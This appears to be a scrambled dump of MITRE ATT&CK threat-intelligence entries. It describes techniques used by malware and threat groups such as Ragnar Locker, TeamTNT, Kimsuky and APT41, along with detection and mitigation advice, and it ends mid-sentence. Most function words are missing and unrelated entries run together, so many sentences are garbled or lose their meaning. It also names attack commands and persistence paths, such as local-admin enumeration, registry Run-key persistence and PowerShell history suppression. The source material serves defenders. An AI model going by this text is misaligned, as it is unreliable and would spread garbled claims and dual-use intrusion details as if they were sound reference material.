a predefined directory.(Citation: TrendMicro Patchwork Dec 2017) executing malicious code, [Ragnar Locker](https://attack.mitre.org/software/S0481) checks Windows API <code>GetLocaleInfoW</code> encrypt files Soviet country.(Citation: FBI Ragnar Locker 2020) [BISCUIT](https://attack.mitre.org/software/S0017) command enumerate running processes identify owners.(Citation: Mandiant APT1 Appendix) Monitor network traffic originating unknown/unexpected hardware devices. Local network traffic metadata (such source MAC addressing) usage network management protocols DHCP helpful identifying hardware. Apply extended ACLs block unauthorized protocols trusted network.(Citation: US-CERT TA17-156A SNMP Abuse 2017) [Xbash](https://attack.mitre.org/software/S0341) perform port scanning TCP UDP ports.(Citation: Unit42 Xbash Sept 2018) Monitor network data uncommon data flows. Processes utilizing network network communication suspicious. [Milan](https://attack.mitre.org/software/S1015) `cmd.exe` discovery actions targeted system.(Citation: ClearSky Siamesekitten August 2021) [TeamTNT](https://attack.mitre.org/groups/G0139) SSH connect victim machines.(Citation: Intezer TeamTNT September 2020) [TeamTNT](https://attack.mitre.org/groups/G0139) SSH transfer tools payloads victim hosts execute them.(Citation: Cisco Talos Intelligence Group) [Forfiles](https://attack.mitre.org/software/S0193) (ex: copy, move, etc.) files/directories (ex: files staging before).(Citation: Überwachung APT28 Forfiles June 2015) [Kazuar](https://attack.mitre.org/software/S0265) compromised WordPress blogs C2 servers.(Citation: Unit 42 Kazuar 2017) Malware [Putter Panda](https://attack.mitre.org/groups/G0024) attempts terminate processes components Sophos Anti-Virus (SAVAdminService.exe SavService.exe).(Citation: CrowdStrike Putter Panda) [IcedID](https://attack.mitre.org/software/S0483) query LDAP identify additional users network infect.(Citation: IBM IcedID November 2017) [Stolen Pencil](https://attack.mitre.org/groups/G0086) gathers credentials [Mimikatz](https://attack.mitre.org/software/S0002) Procdump. (Citation: Netscout Stolen Pencil Dec 2018) [Kessel](https://attack.mitre.org/software/S0487) RC4-encrypt credentials sending C2.(Citation: ESET ForSSHe December 2018)	 [SideCopy](https://attack.mitre.org/groups/G1008) spearphishing emails malicious hta file attachments.(Citation: MalwareBytes SideCopy Dec 2021) Monitor newly constructed logon behavior Atlassian's Confluence configured report access documents AccessLogFilter. (Citation: Atlassian Confluence Logging) Additional log storage analysis infrastructure required robust detection capabilities. [Wizard Spider](https://attack.mitre.org/groups/G0102) Digicert code-signing certificates malware.(Citation: DFIR Ryuk 2 Hour Speed November 2020) [Koadic](https://attack.mitre.org/software/S0250) list directories.(Citation: MalwareBytes LazyScripter Feb 2021) Monitor third-party application logging, messaging, artifacts modify visual content internally externally enterprise network.  scans performed identify unauthorized archival utilities. [Net Crawler](https://attack.mitre.org/software/S0056) [PsExec](https://attack.mitre.org/software/S0029) perform remote service manipulation execute lateral movement.(Citation: Cylance Cleaver) [Bankshot](https://attack.mitre.org/software/S0239) generates false TLS handshake public certificate disguise C2 network communications.(Citation: US-CERT Bankshot Dec 2017) [Remcos](https://attack.mitre.org/software/S0332) command UAC bypassing.(Citation: Fortinet Remcos Feb 2017) [Aoqin Dragon](https://attack.mitre.org/groups/G1007) fake icons including antivirus external drives disguise malicious payloads.(Citation: SentinelOne Aoqin Dragon June 2022) Monitor files establish persistence elevate privileges executing malicious content triggered accessibility features. accessibility utility binaries binary paths correlate software, patch cycles, etc., suspicious. [Agent Tesla](https://attack.mitre.org/software/S0331)  achieved persistence scheduled tasks.(Citation: SentinelLabs Agent Tesla Aug 2020)  [PLEAD](https://attack.mitre.org/software/S0435) ability delete files compromised host.(Citation: TrendMicro BlackTech June 2017) [Bundlore](https://attack.mitre.org/software/S0482) prompts user credentials.(Citation: MacKeeper Bundlore Apr 2019) [Silence](https://attack.mitre.org/groups/G0091) downloaded additional modules malware victim’s machines.(Citation: IB Silence Sept 2018)	 [LoudMiner](https://attack.mitre.org/software/S0451) started cryptomining virtual machine service infected machine.(Citation: ESET LoudMiner June 2019) Monitor executed commands arguments modifications domain trust settings, user application modifies federation settings domain updates domain authentication Managed Federated ActionTypes <code>Set federation settings domain</code> <code>Set domain authentication</code>.(Citation: - Azure Sentinel ADFSDomainTrustMods)(Citation: 365 Defender Solorigate) [Kimsuky](https://attack.mitre.org/groups/G0094) disguised C2 addresses websites shopping malls, governments, universities, others.(Citation: KISA Operation Muzabi) [CopyKittens](https://attack.mitre.org/groups/G0052) <code>-w hidden</code> <code>-windowstyle hidden</code> conceal [PowerShell](https://attack.mitre.org/techniques/T1059/001) windows. (Citation: ClearSky Wilted Tulip July 2017) [CORALDECK](https://attack.mitre.org/software/S0212) created password-protected RAR, WinImage, zip archives exfiltrated.(Citation: FireEye APT37 Feb 2018) [APT39](https://attack.mitre.org/groups/G0087) Mimikatz, Windows Credential Editor ProcDump dump credentials.(Citation: FireEye APT39 Jan 2019) [GravityRAT](https://attack.mitre.org/software/S0237) feature list services system.(Citation: Talos GravityRAT) difficult adversaries advance operation exploitation undiscovered unpatched vulnerabilities sandboxing. types virtualization application microsegmentation mitigate impact types exploitation. Risks additional exploits weaknesses systems exist. (Citation: Ars Technica Pwn2Own 2017 VM Escape) [Leviathan](https://attack.mitre.org/groups/G0065) stolen code signing certificates sign malware.(Citation: FireEye Periscope March 2018)(Citation: FireEye APT40 March 2019) [Zeus Panda](https://attack.mitre.org/software/S0330) collects current time (UTC) sends C2 server.(Citation: GDATA Zeus Panda June 2017) [StoneDrill](https://attack.mitre.org/software/S0380) capability discover OS, Windows version, architecture environment.(Citation: Kaspersky StoneDrill 2017)	 (Citation: Symantec Elderwood Sept 2012) (Citation: NSA/FBI Drovorub August 2020) [ObliqueRAT](https://attack.mitre.org/software/S0644) halt execution identifies processes belonging virtual machine software analysis tools.(Citation: Talos Oblique RAT March 2021) [CharmPower](https://attack.mitre.org/software/S0674) change C2 channel 360 loops retrieving domain actors’ S3 bucket.(Citation: Check APT35 CharmPower January 2022) [HAFNIUM](https://attack.mitre.org/groups/G0125) <code>rundll32</code> load malicious DLLs.(Citation: Volexity Exchange Marauder March 2021) [Operation Wocao](https://attack.mitre.org/campaigns/C0014), threat actors domain credentials, including domain admin, lateral movement privilege escalation.(Citation: FoxIT Wocao December 2019) [Crimson](https://attack.mitre.org/software/S0115) ability discover pluggable/removable drives extract files from.(Citation: Proofpoint Operation Transparent Tribe March 2016)(Citation: Kaspersky Transparent Tribe August 2020) [Stealth Falcon](https://attack.mitre.org/groups/G0038) malware gathers Windows Management Instrumentation (WMI).(Citation: Citizen Lab Stealth Falcon 2016) [RTM](https://attack.mitre.org/software/S0148) delete Registry entries created execution.(Citation: ESET RTM Feb 2017) [Cardinal RAT](https://attack.mitre.org/software/S0348) watchdog component compiled executed delivered victims embedded, uncompiled source code.(Citation: PaloAlto CardinalRat Apr 2017) [Cobian RAT](https://attack.mitre.org/software/S0338) DNS C2.(Citation: Zscaler Cobian Aug 2017) [DarkWatchman](https://attack.mitre.org/software/S0673) HTTPS command control.(Citation: Prevailion DarkWatchman 2021) Check common UAC bypass weaknesses Windows systems aware risk posture address issues appropriate.(Citation: Github UACMe) Internet scanners patterns malicious content designed collect host software visitors.(Citation: ThreatConnect Infrastructure Dec 2020)(Citation: ATT ScanBox)
Much activity occurrence false positive rate, visibility target organization, detection difficult defenders. Detection efforts focused stages adversary lifecycle, Initial Access. [ProLock](https://attack.mitre.org/software/S0654) BITS jobs download malicious payload.(Citation: IB Ransomware September 2020) [BabyShark](https://attack.mitre.org/software/S0414) encoded data [certutil](https://attack.mitre.org/software/S0160) exfiltration.(Citation: Unit42 BabyShark Feb 2019) [Sliver](https://attack.mitre.org/software/S0633) upload files C2 server victim machine <code>upload</code> command.(Citation: GitHub Sliver Upload) Monitor events scripting execution, loading modules scripting languages (ex: JScript.dll vbscript.dll). [SYSCON](https://attack.mitre.org/software/S0464) executed luring victims malicious e-mail attachments.(Citation: Unit 42 CARROTBAT November 2018) Train users double extensions filenames, training bring awareness common phishing spearphishing techniques raise suspicion malicious events. [Kazuar](https://attack.mitre.org/software/S0265) accept multiple URLs C2 servers.(Citation: Unit 42 Kazuar 2017) TACACS+ control commands administrators permitted configuration authentication command authorization. (Citation: Cisco IOS Software Integrity Assurance - TACACS) [OSX/Shlayer](https://attack.mitre.org/software/S0402) resource fork hide compressed binary file terminal, Finder, evade traditional scanners.(Citation: tau bundlore erika noerenberg 2020)(Citation: sentinellabs resource named fork 2020) [Tropic Trooper](https://attack.mitre.org/groups/G0081) administrator account credentials execute backdoor directly.(Citation: TrendMicro Tropic Trooper 2020)	 (Citation: Volexity Exchange Marauder March 2021)(Citation: FireEye Exchange Days March 2021) [Magic Hound](https://attack.mitre.org/groups/G0059) disabled antivirus services targeted systems upload malicious payloads.(Citation: DFIR Report APT35 ProxyShell March 2022) [ShadowPad](https://attack.mitre.org/software/S0596) encoded data readable Latin characters.(Citation: Securelist ShadowPad Aug 2017) Monitor file systems application binaries invalid checksums/signatures. [Skidmap](https://attack.mitre.org/software/S0468) ability download, unpack, decrypt tar.gz files .(Citation: Trend Micro Skidmap)  [Sandworm Team](https://attack.mitre.org/groups/G0034) dedicated network connections victim organization gain unauthorized access separate organization.(Citation: District Court Indictment GRU Unit 74455 October 2020) application control appropriate, execution tools organization's security policies (such rootkit removal tools) abused impair defenses. Ensure approved security applications running enterprise systems. [OilRig](https://attack.mitre.org/groups/G0049) delivered malicious links achieve execution target system.(Citation: Unit 42 OopsIE! Feb 2018)(Citation: Unit 42 QUADAGENT July 2018)(Citation: Crowdstrike Helix Kitten Nov 2018) [BLUELIGHT](https://attack.mitre.org/software/S0657) harvest cookies Internet Explorer, Edge, Chrome, Naver Whale browsers.(Citation: Volexity InkySquid BLUELIGHT August 2021) [Sowbug](https://attack.mitre.org/groups/G0054) extracted documents bundled RAR archive.(Citation: Symantec Sowbug Nov 2017) Outlook methods, blocking macros ineffective Visual Basic engine features separate macro scripting engine.(Citation: SensePost Outlook Forms) released patches address issue. Ensure KB3191938 blocks Outlook Visual Basic displays malicious code warning, KB4011091 disables custom forms default, KB4011162 removes legacy feature, applied systems.(Citation: SensePost Outlook Page) [Chrommme](https://attack.mitre.org/software/S0667) ability capture screenshots.(Citation: ESET Gelsemium June 2021) [BITSAdmin](https://attack.mitre.org/software/S0190) create [BITS Jobs](https://attack.mitre.org/techniques/T1197) upload files compromised host.(Citation: BITSAdmin) [Gelsemium](https://attack.mitre.org/software/S0666) download additional plug-ins compromised host.(Citation: ESET Gelsemium June 2021) [CHOPSTICK](https://attack.mitre.org/software/S0023) capable performing keylogging.(Citation: Crowdstrike DNC June 2016)(Citation: ESET Sednit 2)(Citation: DOJ GRU Indictment Jul 2018) [RTM](https://attack.mitre.org/software/S0148) RSS feed Livejournal update list encrypted C2 server names. [RTM](https://attack.mitre.org/software/S0148) hidden [Pony](https://attack.mitre.org/software/S0453) C2 server IP addresses transactions Bitcoin Namecoin blockchain.(Citation: ESET RTM Feb 2017)(Citation: CheckPoint Redaman October 2019)(Citation: Unit42 Redaman January 2019) Ensure Protected View enabled.(Citation: Protected View) [Transparent Tribe](https://attack.mitre.org/groups/G0134) crafted malicious files exploit CVE-2012-0158 CVE-2010-3333 execution.(Citation: Proofpoint Operation Transparent Tribe March 2016) [LAPSUS$](https://attack.mitre.org/groups/G1004) passwords session tokens Redline password stealer.(Citation: MSTIC DEV-0537 Mar 2022) [Cobalt Group](https://attack.mitre.org/groups/G0080) emails URLs malicious documents.(Citation: Talos Cobalt July 2018)(Citation: Secureworks GOLD KINGSWOOD September 2018) (Citation: Baumgartner Naikon 2015) Monitor newly executed processes result execution subscriptions spawning WmiPrvSe.exe WMI Provider Host process). [Silence](https://attack.mitre.org/groups/G0091) compromised credentials log systems escalate privileges.(Citation: IB Silence Sept 2018) [Chimera](https://attack.mitre.org/groups/G0114) <code>net localgroup administrators</code> identify  accounts local administrative rights.(Citation: NCC Chimera January 2021) Audit account permissions ensure accounts manage servers overlap accounts permissions users internal network acquired Credential Access log server plant pivot server internal network. (Citation: US-CERT Alert TA15-314A Shells) [Ursnif](https://attack.mitre.org/software/S0386) HTTPS C2.(Citation: TrendMicro Ursnif Mar 2015)(Citation: FireEye Ursnif Nov 2017)(Citation: ProofPoint Ursnif Aug 2016) [DarkComet](https://attack.mitre.org/software/S0334) launch remote execute commands victim’s machine.(Citation: Malwarebytes DarkComet March 2018) [BlackMould](https://attack.mitre.org/software/S0564) ability files targeted system.(Citation: GALLIUM December 2019) [BRONZE BUTLER](https://attack.mitre.org/groups/G0060) typically <code>ping</code> [Net](https://attack.mitre.org/software/S0039) enumerate systems.(Citation: Secureworks BRONZE BUTLER Oct 2017) Monitor API calls suspicious behavior reduce false positives normal benign users administrators, DuplicateToken(Ex), ImpersonateLoggedOnUser , SetThreadToken.  (Citation: Palo Alto DNS Requests) [Stolen Pencil](https://attack.mitre.org/groups/G0086) utilized RDP direct remote point-and-click access. (Citation: Netscout Stolen Pencil Dec 2018) [LoudMiner](https://attack.mitre.org/software/S0451) deleted installation files completion.(Citation: ESET LoudMiner June 2019)  technique easily mitigated preventive controls based behaviors performed scope enterprise defenses controls. [ROKRAT](https://attack.mitre.org/software/S0240) decrypt strings victim's hostname key.(Citation: Volexity InkySquid RokRAT August 2021)(Citation: Malwarebytes RokRAT VBA January 2021) [FIN6](https://attack.mitre.org/groups/G0037) fake job advertisements LinkedIn spearphish targets.(Citation: Security Intelligence Eggs Aug 2019) Ensure Protected View enabled.(Citation: Protected View) Periodically baseline snapshots identify malicious modifications additions. Correlating user session distinct lack commands <code>.bash_history</code> clue suspicious behavior. Monitor modification PowerShell command history settings processes created <code>-HistorySaveStyle SaveNothing</code> command-line arguments PowerShell commands <code>Set-PSReadlineOption -HistorySaveStyle SaveNothing</code> <code>Set-PSReadLineOption -HistorySavePath {File Path}</code>. network devices, monitor missing inconsistencies Network Device CLI logging AAA logs specific RADIUS TACAS+ logs. [Kasidet](https://attack.mitre.org/software/S0088) ability identify anti-virus installed infected system.(Citation: Zscaler Kasidet) (Citation: FireEye MESSAGETAP October 2019)(Citation: Crowdstrike GTR2020 Mar 2020) [CreepyDrive](https://attack.mitre.org/software/S1023) local file path upload files from.(Citation: POLONIUM June 2022) [MacMa](https://attack.mitre.org/software/S1016) capability create modify file timestamps.(Citation: ESET DazzleSpy Jan 2022) [NETWIRE](https://attack.mitre.org/software/S0198) spread e-mail campaigns utilizing malicious links.(Citation: Unit 42 NETWIRE April 2020) Monitor files (especially downloaded untrusted locations) MOTW attributes. inspecting scanning file formats commonly abused bypass MOTW (ex: .arj, .gzip, .iso, .vhd). Analyze contextual data executed DLL files, include name, content (ex: signature, headers, data/media), age, user/ower, permissions, etc. [Whitefly](https://attack.mitre.org/groups/G0107) encrypted payload C2.(Citation: Symantec Whitefly March 2019)	 [Kevin](https://attack.mitre.org/software/S1020) `ShowWindow` API avoid detection.(Citation: Kaspersky Lyceum October 2021) [Operation Wocao](https://attack.mitre.org/campaigns/C0014), threat actors injected code selected process, launches command child process original.(Citation: FoxIT Wocao December 2019) [Confucius](https://attack.mitre.org/groups/G0142) downloaded additional files payloads compromised host initial access.(Citation: Uptycs Confucius APT Jan 2021)(Citation: TrendMicro Confucius APT Aug 2021) [RainyDay](https://attack.mitre.org/software/S0629) services establish persistence.(Citation: Bitdefender Naikon April 2021) Monitor Office Registry key. Collect events Registry key modification Office-based persistence. v13.52, Autoruns detect tasks set Office Registry key.(Citation: Palo Alto Office Sofacy) Configure intrusion prevention devices detect SNMP queries commands unauthorized sources.(Citation: US-CERT-TA18-106A) (Citation: Trustwave Pillowmint June 2020)(Citation: CrowdStrike Carbon Spider August 2021) [BabyShark](https://attack.mitre.org/software/S0414) cleaned files secondary payload execution.(Citation: Unit42 BabyShark Apr 2019) [MuddyWater](https://attack.mitre.org/groups/G0069) developed tools Python including [Out1](https://attack.mitre.org/software/S0594).(Citation: Trend Micro Muddy Water March 2021) [Magic Hound](https://attack.mitre.org/groups/G0059) quser.exe identify existing RDP connections.(Citation: DFIR Report APT35 ProxyShell March 2022) application control prevent execution binaries susceptible abuse required network. [Okrum](https://attack.mitre.org/software/S0439) identify proxy servers configured victim, requests C2 server.(Citation: ESET Okrum July 2019) [MarkiRAT](https://attack.mitre.org/software/S0652) gather Keepass password manager.(Citation: Kaspersky Ferocious Kitten Jun 2021)  [Smoke Loader](https://attack.mitre.org/software/S0226) injects Internet Explorer process.(Citation: Talos Smoke Loader July 2018) Monitor analyze traffic patterns packet inspection protocol(s) follow expected protocol standards traffic flows (e.g extraneous packets belong established flows, gratuitous anomalous traffic patterns, anomalous syntax, structure). correlation process monitoring command detect anomalous processes execution command arguments traffic patterns (e.g. monitor anomalies files initiate connections respective protocol(s)). [USBferry](https://attack.mitre.org/software/S0452) execute rundll32.exe memory avoid detection.(Citation: TrendMicro Tropic Trooper 2020)	 [APT38](https://attack.mitre.org/groups/G0082) custom MBR wiper named BOOTWRECK render systems inoperable.(Citation: FireEye APT38 Oct 2018) Monitor newly constructed network connections attempt exfiltrate data Bluetooth command control channel. Processes utilizing network network communication suspicious. Monitor executed processes (such ipconfig/ifconfig arp) arguments details network configuration settings, IP MAC addresses. [PoshC2](https://attack.mitre.org/software/S0378) multiple modules injecting processes, <code>Invoke-PSInject</code>.(Citation: GitHub PoshC2) [Siloscape](https://attack.mitre.org/software/S0623) decrypted password C2 server simple byte byte XOR. [Siloscape](https://attack.mitre.org/software/S0623) writes archive [Tor](https://attack.mitre.org/software/S0183) <code>unzip</code> binary disk data embedded payload Visual Studio’s Resource Manager.(Citation: Unit 42 Siloscape Jun 2021) [FIN7](https://attack.mitre.org/groups/G0046) fragmented strings, environment variables, standard input (stdin), native character-replacement functionalities obfuscate commands.(Citation: FireEye Obfuscation June 2017)(Citation: FireEye FIN7 Aug 2018)(Citation: CrowdStrike Carbon Spider August 2021) Monitor HTA files. typically environment execution suspicious multi-factor authentication remote logins.(Citation: Berkley Secure) [Ramsay](https://attack.mitre.org/software/S0458) created Registry establish persistence.(Citation: Antiy CERT Ramsay April 2020) [Ixeshe](https://attack.mitre.org/software/S0015) custom Base64 encoding schemes obfuscate command control traffic message body requests.(Citation: Moran 2013)(Citation: Trend Micro IXESHE 2012) [BBSRAT](https://attack.mitre.org/software/S0127) modify service configurations.(Citation: Palo Alto Networks BBSRAT) [Zebrocy](https://attack.mitre.org/software/S0251)  method RC4 AES encryption hexadecimal encoding data exfiltration. (Citation: Securelist Sofacy Feb 2018)(Citation: ESET Zebrocy Nov 2018)(Citation: CISA Zebrocy Oct 2020)  [njRAT](https://attack.mitre.org/software/S0385) communicates C2 server custom protocol TCP.(Citation: Fidelis njRAT June 2013) [Proxysvc](https://attack.mitre.org/software/S0238) collects OS version, country name, MAC address, name, physical memory statistics, volume drives system.(Citation: McAfee GhostSecret) (Citation: Symantec Orangeworm April 2018) [Linux Rabbit](https://attack.mitre.org/software/S0362) socket port 22 receives response attempts machine's hostname Top-Level Domain. (Citation: Anomali Linux Rabbit 2018) [DRATzarus](https://attack.mitre.org/software/S0694) API calls running sandbox.(Citation: ClearSky Lazarus Aug 2020) Remove smart cards use. [Operation Wocao](https://attack.mitre.org/campaigns/C0014), threat actors gathered recursive directory listing files directories interest.(Citation: FoxIT Wocao December 2019) [SILENTTRINITY](https://attack.mitre.org/software/S0692) add CLSID key payload execution `Registry.CurrentUser.CreateSubKey("Software\\Classes\\CLSID\\{" + clsid + "}\\InProcServer32")`.(Citation: GitHub SILENTTRINITY Modules July 2019) [SoreFang](https://attack.mitre.org/software/S0516) collect usernames local <code>net.exe user</code>.(Citation: CISA SoreFang July 2016) [PoisonIvy](https://attack.mitre.org/software/S0012) creates backdoor remote attackers command-line interface.(Citation: Symantec Darkmoon Aug 2005) (Citation: CISA AA21-200A APT40 July 2021) Monitor unusual queries cloud provider's storage service. Activity originating unexpected sources improper permissions set allowing access data. Additionally, detecting failed attempts user object, escalation privileges user, access object indication suspicious activity. technique easily mitigated preventive controls based behaviors performed scope enterprise defenses controls. Efforts focus minimizing sensitivity data external parties. [Pysa](https://attack.mitre.org/software/S0583) [PsExec](https://attack.mitre.org/software/S0029) execute ransomware.(Citation: CERT-FR PYSA April 2020) [APT39](https://attack.mitre.org/groups/G0087) [NBTscan](https://attack.mitre.org/software/S0590) custom tools discover remote systems.(Citation: FireEye APT39 Jan 2019)(Citation: BitDefender Chafer 2020)(Citation: Symantec Chafer February 2018) [APT41](https://attack.mitre.org/groups/G0096) legitimate websites C2 dead drop resolvers (DDR), including GitHub, Pastebin, TechNet.(Citation: FireEye APT41 Aug 2019) [Kimsuky](https://attack.mitre.org/groups/G0094) RDP establish persistence.(Citation: CISA AA20-301A Kimsuky) [REvil](https://attack.mitre.org/software/S0496) enumerate active services.(Citation: Intel 471 REvil March 2020) [BLUELIGHT](https://attack.mitre.org/software/S0657) collect passwords stored browers, including Internet Explorer, Edge, Chrome, Naver Whale.(Citation: Volexity InkySquid BLUELIGHT August 2021) [Kwampirs](https://attack.mitre.org/software/S0236) copies network shares laterally victim network.(Citation: Symantec Orangeworm April 2018) [Stuxnet](https://attack.mitre.org/software/S0603) enumerates removable drives infection.(Citation: Symantec W.32 Stuxnet Dossier) program sxstrace.exe included Windows manual inspection check manifest files side-loading vulnerabilities software. [Dok](https://attack.mitre.org/software/S0281) exfiltrates logs execution stored <code>/tmp</code> folder FTP <code>curl</code> command.(Citation: hexed osx.dok analysis 2019)  [NOKKI](https://attack.mitre.org/software/S0353) delete files cover tracks.(Citation: Unit 42 NOKKI Sept 2018) [ccf32](https://attack.mitre.org/software/S1043) temporarily store files hidden directory local host.(Citation: Bitdefender FunnyDream Campaign November 2020) [Magic Hound](https://attack.mitre.org/groups/G0059) compromised email credentials steal sensitive data.(Citation: Certfa Charming Kitten January 2021) [POWRUNER](https://attack.mitre.org/software/S0184) enumerate user directories victim.(Citation: FireEye APT34 Dec 2017) Monitor newly constructed pods deploy container environment facilitate execution evade defenses. [Fox Kitten](https://attack.mitre.org/groups/G0117) installed shells compromised hosts maintain access.(Citation: CISA AA20-259A Iran-Based Actor September 2020)(Citation: ClearSky Pay2Kitten December 2020) [WastedLocker](https://attack.mitre.org/software/S0612) checks specific registry <code>UCOMIEnumConnections</code> <code>IActiveScriptParseProcedure32</code> interfaces.(Citation: NCC WastedLocker June 2020) [Operation Wocao](https://attack.mitre.org/campaigns/C0014), threat actors targeted people based organizational roles privileges.(Citation: FoxIT Wocao December 2019) [APT3](https://attack.mitre.org/groups/G0022) files Windows Admin Shares (like ADMIN$) lateral movement.(Citation: Symantec Buckeye) [HotCroissant](https://attack.mitre.org/software/S0431) ability upload file command control (C2) server victim machine.(Citation: Carbon Black HotCroissant April 2020) Encryption off-system storage sensitive mitigate collection files, adversary acquiring intrusion persists period time adversary discover access data means. Strong passwords encrypted documents prevent offline cracking [Brute Force](https://attack.mitre.org/techniques/T1110) techniques. Monitor newly executed processes arguments modify property list (plist) files. [Duqu](https://attack.mitre.org/software/S0038) examines running processes tokens specific privileges. one, token store use. Eventually start processes stored token attached. steal tokens acquire administrative privileges.(Citation: Kaspersky Duqu 2.0) [Operation Honeybee](https://attack.mitre.org/campaigns/C0006), threat actors <code>sc start</code> start COMSysApp service hijacking <code>sc stop</code> reconfigure COMSysApp.(Citation: McAfee Honeybee) [Revenge RAT](https://attack.mitre.org/software/S0379) collects IP address MAC address system.(Citation: Cylance Shaheen Nov 2018) [DarkVishnya](https://attack.mitre.org/groups/G0105) DameWare Mini Remote Control lateral movement.(Citation: Securelist DarkVishnya Dec 2018) [IcedID](https://attack.mitre.org/software/S0483) WMI execute binaries.(Citation: Juniper IcedID June 2020) [Koadic](https://attack.mitre.org/software/S0250) persistence `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run` Registry key.(Citation: MalwareBytes LazyScripter Feb 2021) [FatDuke](https://attack.mitre.org/software/S0512) files directories compromised host.(Citation: ESET Dukes October 2019) [Ke3chang](https://attack.mitre.org/groups/G0004) malware RoyalDNS DNS C2.(Citation: NCC APT15 Alive Strong) [Kimsuky](https://attack.mitre.org/groups/G0094) enumerated drives, OS type, OS version, script "systeminfo" command.(Citation: Securelist Kimsuky Sept 2013)(Citation: Talos Kimsuky Nov 2021) [ThiefQuest](https://attack.mitre.org/software/S0595) [AppleScript](https://attack.mitre.org/techniques/T1059/002)'s <code>osascript -e</code> command launch [ThiefQuest](https://attack.mitre.org/software/S0595)'s persistence [Launch Agent](https://attack.mitre.org/techniques/T1543/001) [Launch Daemon](https://attack.mitre.org/techniques/T1543/004). (Citation: wardle evilquest parti) [P8RAT](https://attack.mitre.org/software/S0626) download additional payloads target system.(Citation: Securelist APT10 March 2021) [Trojan.Karagany](https://attack.mitre.org/software/S0094) secure C2 communications SSL TLS.(Citation: Secureworks Karagany July 2019) [Sandworm Team](https://attack.mitre.org/groups/G0034) keylogger capture keystrokes SetWindowsHookEx function.(Citation: ESET Telebots Dec 2016)	 [Avenger](https://attack.mitre.org/software/S0473) ability download files C2 compromised host.(Citation: Trend Micro Tick November 2019) [Micropsia](https://attack.mitre.org/software/S0339) creates RAR archive based collected files victim's machine.(Citation: Radware Micropsia July 2018) (Citation: Cybereason Soft Cell June 2019) [Prikormka](https://attack.mitre.org/software/S0113) module collects documents extensions removable media fixed drives connected USB.(Citation: ESET Operation Groundbait) [KeyBoy](https://attack.mitre.org/software/S0387) command launch file browser explorer system.(Citation: PWC KeyBoys Feb 2017) [AuTo Stealer](https://attack.mitre.org/software/S1029) ability collect hostname OS infected host.(Citation: MalwareBytes SideCopy Dec 2021) [Clambling](https://attack.mitre.org/software/S0660) capture keystrokes compromised host.(Citation: Trend Micro DRBControl February 2020)(Citation: Talent-Jump Clambling February 2020) [PipeMon](https://attack.mitre.org/software/S0501) send time zone compromised host C2.(Citation: ESET PipeMon 2020) [BendyBear](https://attack.mitre.org/software/S0574) communicates C2 server port 443 modified RC4 XOR-encrypted chunks.(Citation: Unit42 BendyBear Feb 2021)  [RainyDay](https://attack.mitre.org/software/S0629) Windows Command execution.(Citation: Bitdefender Naikon April 2021) [Mosquito](https://attack.mitre.org/software/S0256) runs <code>tasklist</code> running processes.(Citation: ESET Turla Mosquito Jan 2018) proxies enforce external network communication policy prevents unauthorized external services. (Citation: Symantec MuddyWater Dec 2018)(Citation: TrendMicro POWERSTATS V3 June 2019) Monitor executed commands arguments attempt listing software software versions installed cloud environment. [TeamTNT](https://attack.mitre.org/groups/G0139) disguised scripts docker-related file names.(Citation: Cisco Talos Intelligence Group) Monitor execution command-line arguments <code>AppCmd.exe</code>, abused install malicious IIS modules.(Citation: IIS Modules Overview 2007)(Citation: Unit 42 RGDoor Jan 2018)(Citation: ESET IIS Malware 2021) Monitor newly constructed services/daemons execute commands programs. [Gelsemium](https://attack.mitre.org/software/S0666) ability distinguish standard user administrator compromised host.(Citation: ESET Gelsemium June 2021) [Higaisa](https://attack.mitre.org/groups/G0126) performed padding bytes calculating hash.(Citation: Zscaler Higaisa 2020) [Operation Wocao](https://attack.mitre.org/campaigns/C0014), threat actors' backdoors written Python compiled py2exe.(Citation: FoxIT Wocao December 2019) [Ke3chang](https://attack.mitre.org/groups/G0004) SharePoint enumeration data dumping tool spwebmember.(Citation: NCC APT15 Alive Strong) technique easily mitigated preventive controls based behaviors performed scope enterprise defenses controls. checking existence files, keyword_parm.txt parm.txt, [MESSAGETAP](https://attack.mitre.org/software/S0443) XOR decodes read contents files. (Citation: FireEye MESSAGETAP October 2019) [FlawedAmmyy](https://attack.mitre.org/software/S0381) attempt detect usable smart card current inserted card reader.(Citation: Proofpoint TA505 Mar 2018) [Chimera](https://attack.mitre.org/groups/G0114) <code>time /t</code> <code>net time \\ip/hostname</code> time discovery.(Citation: NCC Chimera January 2021) [LightNeuron](https://attack.mitre.org/software/S0395) capable modifying email content, headers, attachments transit.(Citation: ESET LightNeuron 2019) [Operation Honeybee](https://attack.mitre.org/campaigns/C0006), threat actors zip pack collected files exfiltration.(Citation: McAfee Honeybee) [Empire](https://attack.mitre.org/software/S0363) modules <code>Invoke-SessionGopher</code> extract private key session information.(Citation: Github PowerShell Empire) [WhisperGate](https://attack.mitre.org/software/S0689) shutdown compromised host execution `ExitWindowsEx` `EXW_SHUTDOWN` flag.(Citation: Cisco Ukraine Wipers January 2022) [Cuba](https://attack.mitre.org/software/S0625) query service status <code>QueryServiceStatusEx</code> function.(Citation: McAfee Cuba April 2021) [FunnyDream](https://attack.mitre.org/campaigns/C0007), threat actors downloaded additional droppers backdoors compromised system.(Citation: Bitdefender FunnyDream Campaign November 2020)  [BendyBear](https://attack.mitre.org/software/S0574) query host's Registry key <code>HKEY_CURRENT_USER\Console\QuickEdit</code> retrieve data.(Citation: Unit42 BendyBear Feb 2021) (Citation: ESET RTM Feb 2017) [MURKYTOP](https://attack.mitre.org/software/S0233) capability retrieve groups.(Citation: FireEye Periscope March 2018) [Pteranodon](https://attack.mitre.org/software/S0147) dynamic Windows hashing algorithm map API components.(Citation: Actinium February 2022) [JHUHUGIT](https://attack.mitre.org/software/S0044) exploited CVE-2015-1701 CVE-2015-2387 escalate privileges.(Citation: ESET Sednit 1)(Citation: ESET Sednit July 2015) Monitor newly executed processes downgrade version features outdated, vulnerable, support updated security controls logging. removing verclsid.exe environment. [Kimsuky](https://attack.mitre.org/groups/G0094) compromised legitimate sites distribute malware.(Citation: KISA Operation Muzabi) password user's login keychain changed user's login password. increases complexity adversary additional password. adversaries provisioned VPS (ex: command control server), internet scans reveal servers adversaries acquired. identifiable patterns services listening, certificates use, SSL/TLS negotiation features, response artifacts adversary C2 software.(Citation: ThreatConnect Infrastructure Dec 2020)(Citation: Mandiant SCANdalous Jul 2020)(Citation: Koczwara Beacon Hunting Sep 2021) activity visibility target organization, detection behavior difficult. Detection efforts focused stages adversary lifecycle, Command Control. [APT41](https://attack.mitre.org/groups/G0096) Steam community fallback 